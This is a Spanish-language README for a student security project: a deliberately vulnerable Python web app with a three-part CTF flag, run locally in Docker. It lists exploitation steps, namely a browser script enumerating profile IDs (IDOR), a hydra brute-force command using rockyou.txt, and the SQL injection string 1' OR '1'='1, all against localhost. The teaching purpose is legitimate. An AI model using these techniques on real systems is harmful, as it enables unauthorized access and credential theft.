# Trabajo Integrador DSA 2025  

Se desarrolló una aplicación en python vulnerable a ataques de fuerza bruta y SQL Injection. Además, presenta una vulnerabilidad de tipo Broken Access Control, específicamente Insecure Direct Object Reference (IDOR).

## Autores  
- Federica Montagna (02849/9)
- Juliana Soto (03157/1)
- Lola Dell'Oso (03088/5)

## Dockerfile y docker-compose.yml  
  Se debe ejecutar el comando 'docker compose up' para que Docker levante la aplicación.
  

## Setear la flag  
La aplicación cuenta con una flag dividida en 3 partes. Para cambiar los valores de cada flag, se debe modificar el archivo ./tpi_python/config/.env

Para ver el valor actual de las flags, ejecutar:
cat ./tpi_python/config/.env

Adicionalmente, se pueden modificar las pistas de la página para conseguir la totalidad de las flags.

## Explotación de vulnerabilidades

### Encontrar al usuario admin:
  - Vulnerabilidad IDOR: se debe ejecutar en la consola del navegador el siguiente script:

(async() => {
    for(let id = 2; id <= 100; id++){
        const response = await fetch(`http://localhost:15000/perfil/${id}`);
        const html = await response.text();
        if(html.includes("admin")){
            console.log(`admin encontrado en /perfil/${id}`);
        }
    }
})();

### Encontrar al usuario DSA:
 - Vulnerable a fuerza bruta: se debe ejecutar el siguiente comando:

 hydra -l DSA -P ../rockyou.txt "http-form-post://localhost:15000/login:usuario=^USER^&contrasena=^PASS^:Credenciales inválidas. Por favor, inténtalo de nuevo."

### Encontrar al club con la flag
- Vulnerabilidad SQL Injection: se debe realizar una inyección de SQL haciendo la siguiente búsqueda: 

1' OR '1'='1


## Código corregido

SQL Injection --> 
IDOR --> 
Fuerza bruta --> captcha